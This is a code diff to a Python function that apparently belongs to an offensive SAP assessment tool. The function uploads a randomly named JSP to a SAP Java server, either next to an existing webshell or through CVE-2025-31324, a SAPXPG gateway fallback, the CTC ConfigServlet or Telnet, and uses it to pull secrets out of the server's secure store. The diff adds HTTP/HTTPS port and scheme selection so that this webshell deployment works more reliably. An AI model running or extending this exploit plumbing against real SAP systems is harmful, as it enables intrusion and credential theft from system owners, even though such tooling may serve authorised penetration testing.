@@ -86,12 +86,39 @@ def extract_java_secstore(node: SAPNode, state: SAPMAPState) -> dict:
     # 1. Get (or drop) a working JSP shell.  Reuse the plumbing
     #    create_user_java already uses — CVE-31324 preferred, GW SAPXPG
     #    fallback.  We write the secstore JSP right next to the webshell.
-    http_port = getattr(node, "cve_2025_31324_port", 0) or 0
+    #
+    # Port resolution order:
+    #   1. cve_2025_31324_port — ONLY if CVE-31324 is actually vulnerable
+    #      (else the probe may have settled on the HTTPS port 5NN01,
+    #      and HTTP requests to it get "Connection reset by peer").
+    #   2. java_http service from any instance — guaranteed plain HTTP.
+    #   3. java_https service — fall back to HTTPS scheme.
+    #   4. 5NN00 derived from instance number — assume HTTP.
+    jsp_scheme = "http"
+    http_port = 0
+    if node.cve_2025_31324_vulnerable:
+        http_port = getattr(node, "cve_2025_31324_port", 0) or 0
+        # The CVE probe records whether it used HTTPS.  Use that as
+        # the authoritative source so the URL scheme matches.
+        if http_port and getattr(node, "cve_2025_31324_https", False):
+            jsp_scheme = "https"
     if not http_port:
+        # Prefer plain HTTP — avoids cert verification headaches and
+        # the "Connection reset" failure mode when the JSP probe hits
+        # the TLS port unencrypted.
         for inst in node.instances:
             for p, svc in inst.ports.items():
                 if svc == "java_http":
                     http_port = p; break
+            if http_port: break
+    if not http_port:
+        # Only HTTPS port known — use https:// scheme.
+        for inst in node.instances:
+            for p, svc in inst.ports.items():
+                if svc == "java_https":
+                    http_port = p
+                    jsp_scheme = "https"
+                    break
             if http_port: break
     if not http_port:
         for inst in node.instances:
@@ -105,7 +132,10 @@ def extract_java_secstore(node: SAPNode, state: SAPMAPState) -> dict:
     if not http_port:
         result["error"] = "no Java HTTP port known for JSP deployment"
         return result
-    java_inst = (http_port - 50000) // 100
+    # Derive instance from the HTTP port.  HTTPS is 5NN01, so subtract
+    # one before the //100 division.
+    java_inst_port = http_port - 1 if jsp_scheme == "https" else http_port
+    java_inst = (java_inst_port - 50000) // 100
 
     # Pick delivery path (CVE-31324 > GW > CTC > Telnet)
     use_cve = node.cve_2025_31324_vulnerable
@@ -118,7 +148,8 @@ def extract_java_secstore(node: SAPNode, state: SAPMAPState) -> dict:
     jsp_name = "ss" + "".join(_r.choice(_s.ascii_lowercase) for _ in range(7)) + ".jsp"
     jsp_b64 = _b64.b64encode(_ss.SECSTORE_JSP.encode("utf-8")).decode("ascii")
     target_path = _java_jsp_target_path(node, java_inst, jsp_name)
-    jsp_url = f"http://{node.ip or node.hostname}:{http_port}/irj/{jsp_name}"
+    jsp_url = (f"{jsp_scheme}://{node.ip or node.hostname}"
+               f":{http_port}/irj/{jsp_name}")
     delivery = ("CVE-2025-31324" if use_cve
                 else "GW SAPXPG"  if use_gw
                 else "CTC ConfigServlet (UME admin)" if use_ctc
